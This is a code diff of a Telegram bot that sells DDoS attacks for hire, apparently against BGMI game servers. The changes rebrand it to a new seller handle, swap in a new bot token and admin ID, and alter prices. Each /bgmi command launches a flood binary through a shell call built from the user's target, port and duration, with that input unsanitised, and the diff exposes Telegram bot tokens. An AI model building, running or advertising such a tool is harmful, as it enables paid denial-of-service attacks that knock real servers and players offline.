@@ -19,10 +19,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # insert your Telegram bot token here
-bot = telebot.TeleBot('6985771977:AAHs45lBA9nZ93YsOjhr0LPxjsb6UMctdsg') #telegram bot token from botfather
+bot = telebot.TeleBot('8051776188:AAEfH7tgGO5cM1v_jiY4jdWwgdJHtOGBavY') #telegram bot token from botfather
 
 # Admin user IDs
-admin_id = ["6159360725"] #admin id your tg id
+admin_id = ["7209762563"] #admin id your tg id
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -114,7 +114,7 @@ def add_user(message):
         else:
             response = "Please specify a user ID to add."
     else:
-        response = "Only Admin Can Run This Command by STORM BOT."
+        response = "Only Admin Can Run This Command by @vip_Ddos_07."
 
     bot.reply_to(message, response)
 
@@ -219,7 +219,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊1 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy STORM BOT @BeasTxt_Sasuke"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊1 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy STORM BOT @Vip_Ddos_07"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -236,7 +236,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
-                response = "You Are On Cooldown. Please Wait 0min Before Running The /attack1 Command Again by STORM BOT @BeasTxt_Sasuke key valid till 2 days."
+                response = "You Are On Cooldown. Please Wait 0min Before Running The /attack1 Command Again by  @Vip_Ddos_07 key valid till 2 days."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -253,7 +253,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 500"
+                full_command = f"./bgmi {target} {port} {time} 110"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack1 Finished. Target: {target} Port: {port} Time: {time}"
         else:
@@ -296,7 +296,7 @@ def show_help(message):
 
  To See Admin Commands:
  /admincmd : Shows All Admin Commands.
- By STORM BOT @https://t.me/bgmisellingbuying
+ By @Vip_Ddos_07
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -311,7 +311,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy STORM BOT @https://t.me/bgmisellingbuying"
+    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy @Vip_Ddos_07"
     bot.reply_to(message, response)
 
 
@@ -323,7 +323,7 @@ def welcome_rules(message):
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
 3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
-By STORM BOT FOR key dm @BeasTxt_Sasuke https://t.me/bgmisellingbuying'''
+By STORM BOT FOR key dm @Vip_Ddos_07'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan']) #expire after 2 oct
@@ -339,10 +339,8 @@ Vip :
 Pr-ice List:
 Day--> 50 Rs
 Week--> 190 Rs
-Month--> 600 Rs
-DM @BeasTxt_Sasuke
-By Stoℝᴍ𒆜 BGMI | PVT | SEASON
-By STORM BOT https://t.me/bgmisellingbuying
+Month--> 900 Rs
+DM @Vip_Ddos_07
 '''
     bot.reply_to(message, response)
 
